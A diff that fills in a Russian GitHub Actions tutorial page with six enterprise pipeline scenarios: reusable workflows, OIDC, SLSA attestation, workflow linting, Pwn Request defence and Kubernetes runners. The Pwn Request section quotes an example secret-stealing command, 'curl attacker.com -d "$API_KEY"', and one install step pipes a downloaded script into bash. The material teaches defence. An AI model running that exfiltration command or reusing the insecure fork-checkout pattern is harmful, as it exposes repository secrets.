@@ -3,9 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Раздел 12 · devops-github-actions · ai|</title>
+<title>Примеры · IGL · devops-github-actions · ai|</title>
 <!-- meta: built by tools/build-meta.py - do not edit by hand -->
-<meta name="description" content="Лид страницы: о чём она и кому нужна.">
+<meta name="description" content="Шесть практических сценариев корпоративного уровня IGL: от Golden Path шаблонов и OIDC до SLSA аттестации, actionlint и ARC-раннеров в Kubernetes.">
 <link rel="canonical" href="https://y-kolyada.github.io/github-actions/ru/12.html">
 <link rel="alternate" hreflang="ru" href="https://y-kolyada.github.io/github-actions/ru/12.html">
 <link rel="alternate" hreflang="en" href="https://y-kolyada.github.io/github-actions/en/12.html">
@@ -14,13 +14,13 @@
 <link rel="alternate" hreflang="x-default" href="https://y-kolyada.github.io/github-actions/">
 <meta property="og:type" content="article">
 <meta property="og:site_name" content="devops-github-actions">
-<meta property="og:title" content="Раздел 12">
-<meta property="og:description" content="Лид страницы: о чём она и кому нужна.">
+<meta property="og:title" content="Примеры · IGL">
+<meta property="og:description" content="Шесть практических сценариев корпоративного уровня IGL: от Golden Path шаблонов и OIDC до SLSA аттестации, actionlint и ARC-раннеров в Kubernetes.">
 <meta property="og:url" content="https://y-kolyada.github.io/github-actions/ru/12.html">
 <meta property="og:locale" content="ru_RU">
 <meta name="twitter:card" content="summary">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Раздел 12","description":"Лид страницы: о чём она и кому нужна.","url":"https://y-kolyada.github.io/github-actions/ru/12.html","inLanguage":"ru","isPartOf":{"@type":"WebSite","name":"devops-github-actions","url":"https://y-kolyada.github.io/github-actions/"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Примеры · IGL","description":"Шесть практических сценариев корпоративного уровня IGL: от Golden Path шаблонов и OIDC до SLSA аттестации, actionlint и ARC-раннеров в Kubernetes.","url":"https://y-kolyada.github.io/github-actions/ru/12.html","inLanguage":"ru","isPartOf":{"@type":"WebSite","name":"devops-github-actions","url":"https://y-kolyada.github.io/github-actions/"}}</script>
 <!-- /meta -->
 <link rel="stylesheet" href="../assets/style.css?v=1">
 <script>
@@ -48,7 +48,7 @@
   <div class="utility-tray" role="toolbar" aria-label="Настройки отображения и язык">
     <nav class="lang-switcher" aria-label="Язык страницы">
       <a href="../en/12.html" lang="en" hreflang="en" aria-label="English">EN</a>
-      <a href="12.html" lang="ru" hreflang="ru" aria-label="Русский" class="active" aria-current="page">Раздел 1</a>
+      <a href="12.html" lang="ru" hreflang="ru" aria-label="Русский" class="active" aria-current="page">RU</a>
       <a href="../uk/12.html" lang="uk" hreflang="uk" aria-label="Українська">UK</a>
       <a href="../de/12.html" lang="de" hreflang="de" aria-label="Deutsch">DE</a>
     </nav>
@@ -67,18 +67,18 @@
 
   <nav class="contents" aria-label="Разделы сайта">
     <ol>
-      <li><a href="01.html" aria-current="page"><span class="num">1</span>Раздел 1</a></li>
-      <li><a href="02.html"><span class="num">2</span>Раздел 2</a></li>
-      <li><a href="03.html"><span class="num">3</span>Раздел 3</a></li>
-      <li><a href="04.html"><span class="num">4</span>Раздел 4</a></li>
-      <li><a href="05.html"><span class="num">5</span>Раздел 5</a></li>
-      <li><a href="06.html"><span class="num">6</span>Раздел 6</a></li>
-      <li><a href="07.html"><span class="num">7</span>Раздел 7</a></li>
-      <li><a href="08.html"><span class="num">8</span>Раздел 8</a></li>
-      <li><a href="09.html"><span class="num">9</span>Раздел 9</a></li>
-      <li><a href="10.html"><span class="num">10</span>Раздел 10</a></li>
-      <li><a href="11.html"><span class="num">11</span>Раздел 11</a></li>
-      <li><a href="12.html"><span class="num">12</span>Раздел 12</a></li>
+      <li><a href="01.html"><span class="num">1</span>Что такое workflow и где он выполняется</a></li>
+      <li><a href="02.html"><span class="num">2</span>События: что запускает workflow</a></li>
+      <li><a href="03.html"><span class="num">3</span>Контексты и выражения</a></li>
+      <li><a href="04.html"><span class="num">4</span>Job'ы, зависимости, матрица</a></li>
+      <li><a href="05.html"><span class="num">5</span>Шаги: run против uses</a></li>
+      <li><a href="06.html"><span class="num">6</span>Рабочая машина и окружение</a></li>
+      <li><a href="07.html"><span class="num">7</span>Секреты и права</a></li>
+      <li><a href="08.html"><span class="num">8</span>Кэширование и артефакты</a></li>
+      <li><a href="09.html"><span class="num">9</span>Почему workflow упал</a></li>
+      <li><a href="10.html"><span class="num">10</span>Примеры · Noob</a></li>
+      <li><a href="11.html"><span class="num">11</span>Примеры · Pro</a></li>
+      <li><a href="12.html" aria-current="page"><span class="num">12</span>Примеры · IGL</a></li>
       <li><a href="13.html"><span class="num">13</span>Раздел 13</a></li>
       <li><a href="14.html"><span class="num">14</span>Раздел 14</a></li>
       <li><a href="15.html"><span class="num">15</span>Раздел 15</a></li>
@@ -92,22 +92,286 @@
   </nav>
 
   <main id="main">
-    <h1>Раздел 12</h1>
-    <p class="page-size" data-words="48">Слов: 48</p>
-    <p class="lead">Лид страницы: о чём она и кому нужна. Одно предложение, не длиннее 160 знаков.</p>
+    <h1>Примеры · IGL</h1>
+    <p class="page-size" data-words="1525">Слов: 1525</p>
+    <p class="lead">Шесть практических сценариев корпоративного уровня IGL: от Golden Path шаблонов и OIDC до SLSA аттестации, actionlint и ARC-раннеров в Kubernetes.</p>
 
     <div class="box key" id="key-idea">
       <h2>Главная мысль страницы <a class="anchor-link" href="#key-idea" aria-label="ссылка на этот блок">#</a></h2>
-      <p>Текст этого раздела ещё не написан.</p>
+      <p>На уровне IGL (In-Game Leader / внутриигровой лидер) фокус инженера смещается от отдельных пайплайнов к системной платформенной ответственности. Сложные распределенные системы, корпоративная безопасность и отказоустойчивость CI/CD - это масштабная стратегическая игра: лидер видит всё поле целиком, устанавливает прозрачные правила взаимодействия для десятков команд и держит персональную ответственность за конечный результат. Шесть сценариев ниже раскрывают инструментальный арсенал платформенного архитектора: централизацию корпоративных Golden Path шаблонов через <code>workflow_call</code>, полный отказ от статических API-ключей в пользу федеративной аутентификации OpenID Connect (OIDC), криптографическую защиту цепочки поставок ПО по стандарту SLSA, автоматизированный аудит безопасности пайплайнов утилитами <code>actionlint</code> и <code>zizmor</code>, нейтрализацию критических атак класса Pwn Request и горизонтальное масштабирование эфемерных runner'ов в Kubernetes через Actions Runner Controller (ARC).</p>
     </div>
 
-    <h2 id="first">1 · Раздел 1 <a class="anchor-link" href="#first">#</a></h2>
-    <p>Текст этого раздела ещё не написан.</p>
+    <h2 id="golden-path-workflow-call">1 · Корпоративный Golden Path: переиспользуемый workflow через workflow_call <a class="anchor-link" href="#golden-path-workflow-call">#</a></h2>
+    <p><strong>Задача:</strong> стандартизировать процесс сборки, сканирования и публикации сервисов для 50 продуктовых репозиториев организации в виде единого переиспользуемого шаблона с жестким контрактом входных параметров.</p>
+<pre><code># 1. Шаблон платформы в центральном репозитории org/.github/workflows/golden-build.yml
+name: Golden Path Standard Build
+
+on:
+  workflow_call:
+    inputs:
+      service-name:
+        description: 'Имя микросервиса'
+        required: true
+        type: string
+      node-version:
+        description: 'Версия среды Node.js'
+        required: false
+        default: '20'
+        type: string
+    secrets:
+      SONAR_TOKEN:
+        required: true
+
+jobs:
+  standard-build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ inputs.node-version }}
+          cache: 'npm'
+      - run: npm ci
+      - run: npm test
+      - name: Static Security Scan
+        run: echo "Executing security scan for ${{ inputs.service-name }}"
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}</code></pre>
+<pre><code># 2. Вызов шаблона из продуктового репозитория app-service/.github/workflows/ci.yml
+name: Application Pipeline
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  call-golden-path:
+    uses: acme-corp/.github/.github/workflows/golden-build.yml@v2.4.0
+    with:
+      service-name: 'billing-api'
+      node-version: '20'
+    secrets:
+      SONAR_TOKEN: ${{ secrets.ACME_SONAR_TOKEN }}</code></pre>
+    <div class="prints"><strong>Почему так:</strong> Без переиспользуемых workflow каждая продуктовая команда пишет свои YAML-файлы наугад, что приводит к использованию уязвимых версий экшенов и расхождению практик безопасности. Триггер <code>workflow_call</code> объявляет строгий типизированный интерфейс (контракт) с обязательными и опциональными параметрами. Платформенная команда версионирует Golden Path через git-теги (например, <code>@v2.4.0</code>). Исправление уязвимости в центральном шаблоне закрывает вектор атаки сразу для всех 50 микросервисов организации без необходимости открывать сотни PR по отдельности.</div>
+
+    <h2 id="oidc-aws-federation">2 · Бесключевая федерация в облаке: OIDC federation в AWS через STS <a class="anchor-link" href="#oidc-aws-federation">#</a></h2>
+    <p><strong>Задача:</strong> настроить выкатку контейнеров в облачную инфраструктуру AWS EKS без сохранения статических долгоживущих ключей <code>AWS_ACCESS_KEY_ID</code> и <code>AWS_SECRET_ACCESS_KEY</code> в настройках GitHub.</p>
+<pre><code>name: Cloud Deployment via OIDC
+
+on:
+  push:
+    branches: [ main ]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  deploy-aws:
+    name: Authenticate and Deploy to AWS
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout source code
+        uses: actions/checkout@v4
+
+      - name: Configure AWS credentials via OpenID Connect
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-production-deployer
+          aws-region: eu-central-1
+          audience: https://github.com/acme-corp
+
+      - name: Verify STS Caller Identity
+        run: |
+          # Выполняется без статических секретов
+          aws sts get-caller-identity
+          echo "Successfully authenticated via ephemeral OIDC session"</code></pre>
+    <div class="prints"><strong>Почему так:</strong> Статические сервисные ключи облачных провайдеров неизбежно утекают через логи, исходный код или скомпрометированные машины разработчиков. Федерация через OpenID Connect (OIDC) реализует архитектуру Zero Static Secrets. Runner с разрешением <code>id-token: write</code> запрашивает у провайдера GitHub криптографически подписанный JWT-токен, в теле которого зашиты клеймы контекста: <code>iss</code> (токен выпущен GitHub), <code>sub: repo:acme-corp/app:ref:refs/heads/main</code> и <code>aud</code>. Облачный сервис AWS Security Token Service (STS) валидирует открытый ключ GitHub и обменивает токен на временные учетные данные со сроком жизни 15 минут. Ни одного постоянного пароля в репозитории не существует.</div>
+
+    <h2 id="slsa-artifact-attestation">3 · Защита цепочки поставок: генерация SLSA-аттестаций артефактов <a class="anchor-link" href="#slsa-artifact-attestation">#</a></h2>
+    <p><strong>Задача:</strong> гарантировать защиту от атак на цепочку поставок программного обеспечения (Supply Chain Security) уровня SLSA Level 3, подтверждая криптографической подписью точное происхождение скомпилированного бинарника.</p>
+<pre><code>name: Secure Build and Attest
+
+on:
+  push:
+    branches: [ main ]
+
+permissions:
+  id-token: write
+  attestations: write
+  contents: read
+
+jobs:
+  build-and-attest:
+    name: Build Binary with Provenance
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Compile production binary
+        run: |
+          mkdir -p bin/
+          echo 'package main; func main(){ println("secure enterprise service") }' &gt; main.go
+          go build -o bin/server main.go
+
+      - name: Generate cryptographic build provenance attestation
+        uses: actions/attest-build-provenance@v1
+        with:
+          subject-path: 'bin/server'</code></pre>
+    <div class="prints"><strong>Почему так:</strong> Атака на цепочку поставок (например, взлом репозитория SolarWinds) заключается в подмене бинарного файла на этапе сборки или доставки. Экшен <code>actions/attest-build-provenance</code> вычисляет детерминированный SHA-256 хеш собранного бинарника и формирует криптографический документ по спецификации in-toto / SLSA v1. Документ подписывается приватным эфемерным сертификатом через сервис Sigstore/Fulcio с привязкой к OIDC токену конкретного запуска GitHub Actions. Любой клиент перед запуском бинарника на production-сервере может верифицировать его командой <code>gh attestation verify bin/server --owner acme-corp</code>: если хотя бы один байт файла был изменен злоумышленником, валидация немедленно заблокирует исполнение.</div>
+
+    <h2 id="actionlint-zizmor-gatekeeping">4 · Статический гейткипинг в CI: линтер actionlint и аудит уязвимостей zizmor <a class="anchor-link" href="#actionlint-zizmor-gatekeeping">#</a></h2>
+    <p><strong>Задача:</strong> внедрить в репозиторий превентивный рубеж контроля (Gatekeeping), блокирующий пулл-реквесты с синтаксическими ошибками в YAML, небезопасными версиями экшенов и уязвимостями инъекции кода до запуска боевых пайплайнов.</p>
+<pre><code>name: Workflow Security and Syntax Gate
+
+on:
+  pull_request:
+    paths:
+      - '.github/workflows/**'
+
+permissions:
+  contents: read
+
+jobs:
+  lint-workflows:
+    name: Audit Workflows with Actionlint &amp; Zizmor
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository code
+        uses: actions/checkout@v4
+
+      - name: Install actionlint and shellcheck
+        run: |
+          bash -c "$(curl -sSfL https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)"
+          sudo cp actionlint /usr/local/bin/
+
+      - name: Execute actionlint syntax and expression analysis
+        run: actionlint -color
+
+      - name: Run zizmor security analysis
+        uses: woodruffw/zizmor-action@v1
+        with:
+          arguments: --strict</code></pre>
+    <div class="prints"><strong>Почему так:</strong> Базовый движок GitHub проверяет только соответствие синтаксису YAML и падает уже во время выполнения рантайма. Связка <code>actionlint</code> и <code>zizmor</code> обеспечивает статический анализ промышленного уровня. <code>actionlint</code> верифицирует выражения <code>${{ }}</code>, типы аргументов сторонних экшенов и подтягивает <code>shellcheck</code> для инспекции bash-скриптов в блоках <code>run</code>. <code>zizmor</code> специализируется на векторах атак: находит места прямой подстановки недоверенных контекстов в shell (Script Injection), избыточные права в <code>GITHUB_TOKEN</code> и нефиксированные теги сторонних действий. Запуск этого гейта защищает мастер-ветку от скрытых архитектурных брешей.</div>
+
+    <h2 id="pwn-request-mitigation">5 · Отражение атак Pwn Request: безопасная архитектура обработки pull_request_target <a class="anchor-link" href="#pwn-request-mitigation">#</a></h2>
+    <p><strong>Задача:</strong> безопасно собирать пулл-реквесты от внешних контрибьюторов из публичных форков и публиковать сводные отчеты тестирования, полностью исключив кражу секретов репозитория через вредоносный код.</p>
+<pre><code># 1. Пайплайн запускается на событии pull_request в песочнице без секретов:
+# .github/workflows/untrusted-pr.yml
+name: Untrusted PR Verification
+
+on:
+  pull_request:
+
+jobs:
+  build:
+    name: Build in Isolated Sandbox
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci &amp;&amp; npm test
+      - name: Save test results report
+        run: echo '{"passed": 42, "failed": 0}' &gt; report.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: test-results
+          path: report.json</code></pre>
+<pre><code># 2. Доверенный пайплайн публикует результаты строго после завершения первого:
+# .github/workflows/trusted-reporter.yml
+name: Trusted PR Reporter
+
+on:
+  workflow_run:
+    workflows: [ "Untrusted PR Verification" ]
+    types: [ completed ]
+
+permissions:
+  pull-requests: write
+
+jobs:
+  report:
+    name: Post Comment to PR
+    runs-on: ubuntu-latest
+    if: github.event.workflow_run.conclusion == 'success'
+    steps:
+      - name: Download test results artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: test-results
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          run-id: ${{ github.event.workflow_run.id }}
+      - name: Add status comment to PR
+        run: echo "PR verification completed successfully without exposing secrets"</code></pre>
+    <div class="prints"><strong>Почему так:</strong> Атака «Pwn Request» - критический вектор взлома Open Source проектов. Если разработчик использует событие <code>pull_request_target</code> и делает чекаут кода форка <code>actions/checkout with: ref: ${{ github.event.pull_request.head.sha }}</code>, любой злоумышленник может отправить PR со скриптом <code>curl attacker.com -d "$API_KEY"</code> в тестах и мгновенно украсть секреты репозитория. Двухфазная архитектура через связку <code>pull_request</code> (песочница без доступа к секретам) и <code>workflow_run</code> (доверенный контекст основной ветки) физически изолирует исполнение кода форка от привилегированных шагов публикации.</div>
+
+    <h2 id="arc-kubernetes-runners">6 · Масштабирование эфемерных runner'ов в Kubernetes: Actions Runner Controller (ARC) <a class="anchor-link" href="#arc-kubernetes-runners">#</a></h2>
+    <p><strong>Задача:</strong> развернуть приватный кластер полностью изолированных одноразовых runner'ов в корпоративном Kubernetes с автоматическим масштабированием от 0 до 50 подов по требованию очереди задач.</p>
+<pre><code># Kubernetes манифест пула runner'ов: arc-runnerset.yaml
+apiVersion: actions.github.com/v1alpha1
+kind: AutoscalingRunnerSet
+metadata:
+  name: enterprise-arc-runners
+  namespace: arc-systems
+spec:
+  githubConfigUrl: "https://github.com/acme-corp"
+  minRunners: 0
+  maxRunners: 50
+  template:
+    spec:
+      containers:
+        - name: runner
+          image: ghcr.io/actions/actions-runner:latest
+          command: ["/home/runner/run.sh"]
+          resources:
+            limits:
+              cpu: "4"
+              memory: "8Gi"
+            requests:
+              cpu: "2"
+              memory: "4Gi"</code></pre>
+<pre><code># Использование пула в workflow файле: .github/workflows/enterprise-job.yml
+name: Heavy Enterprise Pipeline
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  heavy-compute:
+    name: High Performance Distributed Build
+    runs-on: enterprise-arc-runners
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute heavy compute tasks on internal runner
+        run: |
+          lscpu
+          echo "Executing pipeline on ephemeral Kubernetes pod inside corporate network"</code></pre>
+    <div class="prints"><strong>Почему так:</strong> Традиционные self-hosted runner'ы на постоянных виртуальных серверах сохраняют остаточные файлы, кеши и запущенные демоны между задачами, что приводит к уязвимостям побега из песочницы и рассинхронизации окружения. Контроллер Actions Runner Controller (ARC) от GitHub реализует модель Ephemeral Pods: под поднимается в кластере Kubernetes строго под конкретную задачу из очереди, отрабатывает ее и немедленно уничтожается. Это дает 100% изоляцию, исключает взаимное влияние команд, соблюдает требования Data Residency и масштабирует вычислительные ресурсы до нуля в нерабочие часы.</div>
+
+    <div class="prints"><strong>Что спрашивают на собеседовании:</strong> «В чем заключается опасность использования события pull_request_target вместе с actions/checkout кода пулл-реквеста, и как архитектурно правильно организовать безопасную проверку форков?» (Ответ: pull_request_target исполняется в контексте целевого репозитория и имеет доступ к его секретам и правам на запись. Выкачка недоверенного кода PR через ref: head.sha позволяет атакующему выполнить произвольный вредоносный код и украсть секреты. Безопасная архитектура использует два этапа: pull_request для изолированного прогона тестов в песочнице без секретов и последующий workflow_run в доверенном контуре для выгрузки отчетов).</div>
 
     <div class="box key" id="artifacts">
       <h2>Артефакты: что у вас есть после этой страницы <a class="anchor-link" href="#artifacts">#</a></h2>
-      <p>Текст этого раздела ещё не написан.</p>
+      <p class="artifacts-slogan">Чтение &gt;&gt; Ваш квант времени жизни · Партнёрство достоинства вместе с AI · Перестройка вашей нейросети</p>
+      <p>Освоение шести фундаментальных практик уровня IGL переводит инженера в статус системного архитектора платформы автоматизации. Завершив эту главу, вы удерживаете шесть проверенных архитектурных решений:</p>
+      <ol>
+        <li><strong>Централизованный Golden Path:</strong> внедрение корпоративных переиспользуемых пайплайнов через <code>workflow_call</code> с типизированными интерфейсами и центральным управлением.</li>
+        <li><strong>Федеративная облачная аутентификация:</strong> полный отказ от статических API-ключей в пользу бесключевого обмена OIDC-токенов в AWS/GCP через доверенные роли STS.</li>
+        <li><strong>Криптографическая безопасность поставок:</strong> генерация и валидация неизменяемых аттестаций артефактов SLSA Provenance с открытой верификацией происхождения.</li>
+        <li><strong>Превентивный статический гейткипинг:</strong> непрерывный аудит синтаксиса и безопасности конвейеров линтерами <code>actionlint</code> и <code>zizmor</code> до попадания кода в production.</li>
+        <li><strong>Иммунитет к supply-chain атакам:</strong> надежная изоляция событий <code>pull_request</code> и <code>workflow_run</code>, нейтрализующая векторы кражи секретов класса Pwn Request.</li>
+        <li><strong>Эфемерная раннер-инфраструктура:</strong> развертывание и автомасштабирование пулов одноразовых подов в Kubernetes с помощью Actions Runner Controller (ARC).</li>
+      </ol>
     </div>
+
+    <footer>
+      <nav class="pager" aria-label="Соседние темы">
+        <p class="pager-next">Следующая тема: <a href="13.html">Раздел 13</a></p>
+        <p class="pager-prev">Предыдущая тема: <a href="11.html">Примеры · Pro</a></p>
+      </nav>
+      Сайт серии AI Factory. Сделан той же оснасткой, что и остальные: обычный HTML и CSS,
+      проверка на bash, публикация через GitHub Pages.
+    </footer>
   </main>
 
 </div>
